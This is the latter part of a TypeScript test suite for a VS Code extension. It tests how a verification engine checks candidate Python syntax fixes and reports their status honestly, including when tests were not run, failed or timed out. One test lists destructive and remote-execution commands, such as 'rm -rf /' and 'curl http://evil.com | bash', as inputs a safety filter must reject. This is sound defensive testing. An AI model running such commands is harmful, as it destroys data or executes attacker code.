      id: "fix-colon-add",
      title: "Insert missing ':'",
      description: "Appends colon",
      edits: [
        {
          range: { start: { line: 0, character: 15 }, end: { line: 0, character: 15 } },
          new_text: ":",
        },
      ],
      verification: {
        status: "PARTIALLY_VERIFIED",
        checks: [
          { name: "Lexical Tokenization", passed: true, status: "PASSED", message: "Source tokenized cleanly" },
          { name: "AST Syntax Parse", passed: true, status: "PASSED", message: "Patched source forms a valid AST" },
          { name: "Bytecode Compilation", passed: true, status: "PASSED", message: "Bytecode compiled" },
        ],
        limitation: "Static verification only; automated tests not run.",
      },
    };
    const diag: DiagnosticInput = {
      message: "SyntaxError: expected ':'",
      range: { start: { line: 0, character: 14 }, end: { line: 0, character: 14 } },
      severity: 1,
    };

    const report = await verifEngine.verifyFix(mockContext, mockDoc, fix, diag, { runTests: false });
    assert.ok(report, "Report should be generated");
    assert.strictEqual(report.status, "PARTIALLY_VERIFIED", "Status must be PARTIALLY_VERIFIED without tests");

    const testCheck = report.checks.find((c) => c.name === "Automated Test Execution");
    assert.ok(testCheck, "Automated Test Execution check must exist");
    assert.strictEqual(testCheck!.status, "NOT_CHECKED", "Unexecuted tests must be NOT_CHECKED");
    assert.strictEqual(testCheck!.passed, false, "Unexecuted tests must not be marked passed");

    const simCheck = report.checks.find((c) => c.name === "WorkspaceEdit Simulation");
    assert.ok(simCheck && simCheck.passed, "WorkspaceEdit simulation check must pass");
    assert.ok(report.unresolved_risks.length > 0, "Unresolved risks must be preserved");
  });

  // Test 31: VerificationEngine reports PARTIALLY_VERIFIED when static checks pass but automated tests are unperformed
  await test("VerificationEngine does not falsely claim full verification when automated tests are unperformed", async () => {
    const verifEngine = new VerificationEngine(bridge, channel as any);
    const mockDoc: any = {
      uri: { toString: () => "file:///d:/project/app.py", fsPath: "d:/project/app.py" },
      getText: () => "msg = 'hello world\n",
      languageId: "python",
    };
    const fix: CandidateFix = {
      id: "fix-quote",
      title: "Close string quote",
      description: "Appends quote",
      edits: [{ range: { start: { line: 0, character: 18 }, end: { line: 0, character: 18 } }, new_text: "'" }],
      verification: {
        status: "PARTIALLY_VERIFIED",
        checks: [
          { name: "Lexical Tokenization", passed: true, status: "PASSED", message: "Tokens valid" },
          { name: "AST Syntax Parse", passed: true, status: "PASSED", message: "AST valid" },
        ],
        limitation: "Lexical and syntax validity confirmed.",
      },
    };
    const diag: DiagnosticInput = {
      message: "SyntaxError: unterminated string literal",
      range: { start: { line: 0, character: 6 }, end: { line: 0, character: 18 } },
      severity: 1,
    };

    const report = await verifEngine.verifyFix(mockContext, mockDoc, fix, diag);
    assert.notStrictEqual(report.status, "PASSED", "Fix must never be marked PASSED without automated test execution");
    assert.strictEqual(report.status, "PARTIALLY_VERIFIED");
    assert.ok(report.limitation.includes("tests were not run") || report.limitation.includes("automated tests"), "Limitation must mention tests were not run");
  });

  // Test 32: VerificationEngine reports FAILED when static compiler checks reject the patch
  await test("VerificationEngine reports FAILED when static compiler checks reject the patch", async () => {
    const verifEngine = new VerificationEngine(bridge, channel as any);
    const mockDoc: any = {
      uri: { toString: () => "file:///d:/project/bad.py", fsPath: "d:/project/bad.py" },
      getText: () => "x = [1, 2\n",
      languageId: "python",
    };
    const fix: CandidateFix = {
      id: "fix-bad",
      title: "Broken patch",
      description: "Inserts broken syntax",
      edits: [{ range: { start: { line: 0, character: 9 }, end: { line: 0, character: 9 } }, new_text: "???" }],
      verification: {
        status: "FAILED",
        checks: [
          { name: "Lexical Tokenization", passed: false, status: "FAILED", message: "TokenError: unexpected character" },
        ],
        limitation: "Failed lexical tokenization.",
      },
    };
    const diag: DiagnosticInput = {
      message: "SyntaxError: unexpected EOF",
      range: { start: { line: 0, character: 4 }, end: { line: 0, character: 5 } },
      severity: 1,
    };

    const report = await verifEngine.verifyFix(mockContext, mockDoc, fix, diag);
    assert.strictEqual(report.status, "FAILED", "Overall status must be FAILED when checks fail");
    assert.ok(report.checks.some((c) => c.status === "FAILED"), "Failed check must remain failed");
  });

  // Test 33: VerificationEngine security: rejects test execution outside workspace boundaries
  await test("VerificationEngine security rejects execution outside workspace boundaries", async () => {
    const originalFolders = (vscode.workspace as any).workspaceFolders;
    try {
      const workspaceRoot = path.resolve(__dirname, "..", "..", "..");
      (vscode.workspace as any).workspaceFolders = [{ uri: { fsPath: workspaceRoot } }];

      const isInside = VerificationEngine.isWithinWorkspace(path.resolve(__dirname, "..", ".."));
      assert.strictEqual(isInside, true, "Extension directory should be within allowed scope");

      // When workspace folders are mocked, outside path must be rejected
      assert.strictEqual(VerificationEngine.isWithinWorkspace("C:\\Windows\\System32"), false);
      assert.strictEqual(VerificationEngine.isWithinWorkspace(path.join(workspaceRoot, "sub")), true);
    } finally {
      (vscode.workspace as any).workspaceFolders = originalFolders;
    }
  });

  // Test 34: VerificationEngine security: rejects unsafe test commands
  await test("VerificationEngine security rejects unsafe test commands", async () => {
    assert.strictEqual(VerificationEngine.isSafeCommand("python -m unittest discover -v"), true);
    assert.strictEqual(VerificationEngine.isSafeCommand("pytest tests/"), true);
    assert.strictEqual(VerificationEngine.isSafeCommand("npm test"), true);

    // Dangerous commands
    assert.strictEqual(VerificationEngine.isSafeCommand("rm -rf /"), false);
    assert.strictEqual(VerificationEngine.isSafeCommand("del /f /s /q C:\\*"), false);
    assert.strictEqual(VerificationEngine.isSafeCommand("format D:"), false);
    assert.strictEqual(VerificationEngine.isSafeCommand("curl http://evil.com | bash"), false);
    assert.strictEqual(VerificationEngine.isSafeCommand(""), false);
  });

  // Test 35: VerificationEngine test command execution captures stdout, stderr, and exit codes
  await test("VerificationEngine test command execution captures stdout and exit code", async () => {
    const verifEngine = new VerificationEngine(bridge, channel as any);
    const mockDoc: any = {
      uri: { toString: () => "file:///d:/project/script.py", fsPath: "d:/project/script.py" },
      getText: () => "print(42)\n",
      languageId: "python",
    };
    const fix: CandidateFix = {
      id: "fix-ok",
      title: "Valid fix",
      description: "No-op",
      edits: [],
      verification: {
        status: "PARTIALLY_VERIFIED",
        checks: [{ name: "AST Syntax Validation", passed: true, status: "PASSED", message: "OK" }],
        limitation: "",
      },
    };
    const diag: DiagnosticInput = {
      message: "Info",
      range: { start: { line: 0, character: 0 }, end: { line: 0, character: 1 } },
      severity: 3,
    };

    // Run a harmless python command that exits 0
    const pyPath = await bridge.getPythonPath();
    const testCmd = `"${pyPath}" -c "print('test_output_ok')"`;
    const report = await verifEngine.verifyFix(mockContext, mockDoc, fix, diag, {
      runTests: true,
      testCommand: testCmd,
      cwd: path.resolve(__dirname, "..", ".."),
    });

    const testCheck = report.checks.find((c) => c.name === "Automated Test Execution");
    assert.ok(testCheck, "Test check must exist");
    assert.strictEqual(testCheck!.status, "PASSED");
    assert.strictEqual(testCheck!.exit_code, 0);
    assert.ok(testCheck!.stdout?.includes("test_output_ok"));
    assert.strictEqual(report.status, "PASSED", "With tests passing and static checks passing, status is PASSED");
  });

  // Test 36: EngineBridge interact handles verify, tests, diff, and evidence keywords distinctly
  await test("EngineBridge interact handles verify, tests, diff, and evidence keywords distinctly", async () => {
    const code = "total = sum([1, 2, 3\ndef compute():\n    return 42\n";
    const invReq: InvestigationRequest = {
      command: "investigate",
      document: { uri: "file:///test.py", text: code, language_id: "python" },
      diagnostic: {
        message: "SyntaxError: invalid syntax",
        range: { start: { line: 1, character: 0 }, end: { line: 1, character: 3 } },
        severity: 1,
      },
    };
    const invRes = await bridge.investigate(mockContext, invReq);

    // 1. diff keyword
    const diffReq: InteractionRequest = {
      command: "interact",
      document: { uri: "file:///test.py", text: code, language_id: "python" },
      diagnostic: invReq.diagnostic,
      investigation_result: invRes,
      user_message: "diff",
      history: [],
    };
    const diffRes = await bridge.interact(mockContext, diffReq);
    assert.strictEqual(diffRes.status, "success");
    assert.ok(diffRes.message.includes("diff") || diffRes.message.includes("---") || diffRes.message.includes("+++"));

    // 2. verify keyword
    const verifReq: InteractionRequest = {
      command: "interact",
      document: { uri: "file:///test.py", text: code, language_id: "python" },
      diagnostic: invReq.diagnostic,
      investigation_result: invRes,
      user_message: "verify",
      history: [],
    };
    const verifRes = await bridge.interact(mockContext, verifReq);
    assert.strictEqual(verifRes.status, "success");
    assert.ok(verifRes.message.includes("Verification") || verifRes.message.includes("Checks"));

    // 3. tests keyword
    const testsReq: InteractionRequest = {
      command: "interact",
      document: { uri: "file:///test.py", text: code, language_id: "python" },
      diagnostic: invReq.diagnostic,
      investigation_result: invRes,
      user_message: "tests",
      history: [],
    };
    const testsRes = await bridge.interact(mockContext, testsReq);
    assert.strictEqual(testsRes.status, "success");
    assert.strictEqual(testsRes.action, "run_tests");

    // 4. history keyword
    const histReq: InteractionRequest = {
      command: "interact",
      document: { uri: "file:///test.py", text: code, language_id: "python" },
      diagnostic: invReq.diagnostic,
      investigation_result: invRes,
      user_message: "history",
      history: [],
    };
    const histRes = await bridge.interact(mockContext, histReq);
    assert.strictEqual(histRes.status, "success");
    assert.strictEqual(histRes.action, "show_history");
  });

  // Test 37: InvestigationViewProvider handles reopenRecord and restores context
  await test("InvestigationViewProvider handles reopenRecord and restores context", async () => {
    let reopenedId = "";
    const viewProvider = new InvestigationViewProvider(
      mockContext.extensionUri,
      async () => true,
      async () => {},
      undefined,
      undefined,
      undefined,
      undefined,
      async (id: string) => { reopenedId = id; }
    );

    let currentHtml = "";
    let messageListener: ((msg: any) => Promise<void>) | undefined;
    const mockWebviewView: any = {
      webview: {
        options: {},
        set html(val: string) { currentHtml = val; },
        get html() { return currentHtml; },
        onDidReceiveMessage: (handler: any) => { messageListener = handler; },
      },
      show: () => {},
    };
    viewProvider.resolveWebviewView(mockWebviewView, {} as any, {} as any);

    const record: InvestigationRecord = {
      id: "inv-test-reopen-999",
      created_at: new Date().toISOString(),
      updated_at: new Date().toISOString(),
      status: "PARTIALLY_VERIFIED",
      document_uri: "file:///d:/project/test.py",
      document_version: 1,
      source_hash: "hash123",
      source_excerpt: "def foo(): pass",
      diagnostic: { message: "Test diagnostic", range: { start: { line: 0, character: 0 }, end: { line: 0, character: 4 } }, severity: 1 },
      problem_description: "Test problem",
      category: "MISSING_COLON",
      explanation: { summary: "Summary explanation", details: "Detailed explanation" },
      evidence: [],
      candidate_fixes: [
        {
          id: "fix-1",
          title: "Fix 1",
          description: "Desc",
          edits: [],
          verification: { status: "PARTIALLY_VERIFIED", checks: [], limitation: "Static only" },
        },
      ],
      decision_status: "PENDING",
      applied_diff: null,
      unresolved_risks: ["Runtime unverified"],
      history: [{ role: "user", content: "why did this fail?" }, { role: "assistant", content: "Missing colon." }],
      metadata: {},
    };

    await viewProvider.showRecord(record);
    assert.ok(currentHtml.includes("inv-test-reopen-999"), "Webview must display restored record ID");
    assert.ok(currentHtml.includes("MISSING_COLON"), "Webview must display restored category");
    assert.ok(currentHtml.includes("why did this fail?"), "Webview must restore conversation history");

    // Simulate clicking reopen in webview
    assert.ok(messageListener);
    await messageListener!({ command: "reopenRecord", recordId: "inv-other-456" });
    assert.strictEqual(reopenedId, "inv-other-456", "Reopen record callback must be invoked with record ID");
  });

  // Test 38: End-to-end integration: investigation -> store record -> verify candidate fix -> record decision
  await test("End-to-end workflow: investigate -> store -> verify -> record update", async () => {
    const store = new InvestigationStore(mockContext);
    const verifEngine = new VerificationEngine(bridge, channel as any);

    const code = "def calculate(a, b)\n    return a + b\n";
    const req: InvestigationRequest = {
      command: "investigate",
      document: { uri: "file:///e2e.py", text: code, language_id: "python" },
      diagnostic: {
        message: "SyntaxError: expected ':'",
        range: { start: { line: 0, character: 19 }, end: { line: 0, character: 19 } },
        severity: 1,
      },
    };
    const invResult = await bridge.investigate(mockContext, req);
    assert.strictEqual(invResult.status, "success");

    const mockDoc: any = {
      uri: { toString: () => "file:///e2e.py", fsPath: "e2e.py" },
      version: 1,
      getText: () => code,
      languageId: "python",
    };

    // 1. Create and store record
    const record = store.createRecord(invResult, mockDoc);
    await store.saveRecord(record);
    assert.ok(record.id);
    assert.strictEqual(record.status, "PARTIALLY_VERIFIED");
    assert.strictEqual(record.decision_status, "PENDING");

    // 2. Independently verify the candidate fix
    const fix = record.candidate_fixes[0];
    assert.ok(fix);
    const report = await verifEngine.verifyFix(mockContext, mockDoc, fix, record.diagnostic, { runTests: false });
    assert.strictEqual(report.status, "PARTIALLY_VERIFIED");

    // 3. Update record with verification outcome
    record.verification_report = report;
    record.unresolved_risks = report.unresolved_risks;
    await store.saveRecord(record);

    // 4. Simulate applying fix and updating engineering record
    record.status = "APPLIED";
    record.decision_status = "APPLIED";
    record.applied_diff = fix.diff || "+def calculate(a, b):";
    await store.saveRecord(record);

    // 5. Retrieve persisted record and assert state reflects reality
    const finalRecord = await store.getRecord(record.id);
    assert.ok(finalRecord);
    assert.strictEqual(finalRecord!.status, "APPLIED");
    assert.strictEqual(finalRecord!.decision_status, "APPLIED");
    assert.ok(finalRecord!.applied_diff);
    assert.ok(finalRecord!.verification_report);
    assert.strictEqual(finalRecord!.verification_report!.status, "PARTIALLY_VERIFIED");
  });

  // Test 39: VerificationEngine handles failing test command execution and sets status to FAILED
  await test("VerificationEngine handles failing test command execution and reports FAILED", async () => {
    const verifEngine = new VerificationEngine(bridge, channel as any);
    const mockDoc: any = {
      uri: { toString: () => "file:///fail_test.py", fsPath: "fail_test.py" },
      getText: () => "x = 1\n",
      languageId: "python",
    };
    const fix: CandidateFix = {
      id: "fix-failing-test",
      title: "Fix with failing test",
      description: "Triggers test failure",
      edits: [],
      verification: {
        status: "PARTIALLY_VERIFIED",
        checks: [{ name: "AST Syntax Validation", passed: true, status: "PASSED", message: "OK" }],
        limitation: "",
      },
    };
    const diag: DiagnosticInput = {
      message: "Warning",
      range: { start: { line: 0, character: 0 }, end: { line: 0, character: 1 } },
      severity: 2,
    };

    const pyPath = await bridge.getPythonPath();
    const failCmd = `"${pyPath}" -c "import sys; sys.exit(2)"`;
    const report = await verifEngine.verifyFix(mockContext, mockDoc, fix, diag, {
      runTests: true,
      testCommand: failCmd,
      cwd: path.resolve(__dirname, "..", ".."),
    });

    assert.strictEqual(report.status, "FAILED");
    const testCheck = report.checks.find((c) => c.name === "Automated Test Execution");
    assert.ok(testCheck);
    assert.strictEqual(testCheck!.status, "FAILED");
    assert.strictEqual(testCheck!.passed, false);
    assert.strictEqual(testCheck!.exit_code, 2);
    assert.ok(report.unresolved_risks.some((r) => r.includes("failed")));
  });

  // Test 40: VerificationEngine handles unavailable verification tools with UNABLE_TO_VERIFY
  await test("VerificationEngine handles unavailable verification tools with UNABLE_TO_VERIFY", async () => {
    const verifEngine = new VerificationEngine(bridge, channel as any);
    const mockDoc: any = {
      uri: { toString: () => "file:///missing_tool.py", fsPath: "missing_tool.py" },
      getText: () => "x = 1\n",
      languageId: "python",
    };
    const fix: CandidateFix = {
      id: "fix-missing-tool",
      title: "Fix with missing tool",
      description: "Attempts nonexistent tool",
      edits: [],
      verification: {
        status: "PARTIALLY_VERIFIED",
        checks: [{ name: "AST Syntax Validation", passed: true, status: "PASSED", message: "OK" }],
        limitation: "",
      },
    };
    const diag: DiagnosticInput = {
      message: "Warning",
      range: { start: { line: 0, character: 0 }, end: { line: 0, character: 1 } },
      severity: 2,
    };

    const missingCmd = "compilermate_nonexistent_command_xyz_123";
    const report = await verifEngine.verifyFix(mockContext, mockDoc, fix, diag, {
      runTests: true,
      testCommand: missingCmd,
      cwd: path.resolve(__dirname, "..", ".."),
    });

    assert.strictEqual(report.status, "UNABLE_TO_VERIFY");
    const testCheck = report.checks.find((c) => c.name === "Automated Test Execution");
    assert.ok(testCheck);
    assert.strictEqual(testCheck!.status, "UNABLE_TO_VERIFY");
    assert.strictEqual(testCheck!.passed, false);
  });

  // Test 41: VerificationEngine handles test execution timeout and limits duration
  await test("VerificationEngine handles test runner timeout gracefully", async () => {
    const verifEngine = new VerificationEngine(bridge, channel as any);
    const mockDoc: any = {
      uri: { toString: () => "file:///timeout.py", fsPath: "timeout.py" },
      getText: () => "x = 1\n",
      languageId: "python",
    };
    const fix: CandidateFix = {
      id: "fix-timeout",
      title: "Fix with timeout",
      description: "Triggers timeout",
      edits: [],
      verification: {
        status: "PARTIALLY_VERIFIED",
        checks: [{ name: "AST Syntax Validation", passed: true, status: "PASSED", message: "OK" }],
        limitation: "",
      },
    };
    const diag: DiagnosticInput = {
      message: "Warning",
      range: { start: { line: 0, character: 0 }, end: { line: 0, character: 1 } },
      severity: 2,
    };

    const pyPath = await bridge.getPythonPath();
    const sleepCmd = `"${pyPath}" -c "import time; time.sleep(3)"`;
    const report = await verifEngine.verifyFix(mockContext, mockDoc, fix, diag, {
      runTests: true,
      testCommand: sleepCmd,
      cwd: path.resolve(__dirname, "..", ".."),
      timeoutMs: 400,
    });

    assert.strictEqual(report.status, "FAILED");
    const testCheck = report.checks.find((c) => c.name === "Automated Test Execution");
    assert.ok(testCheck);
    assert.strictEqual(testCheck!.status, "FAILED");
    assert.ok(testCheck!.message.includes("timed out") || (testCheck!.duration_ms ?? 0) >= 350);
  });

  return failed;
}
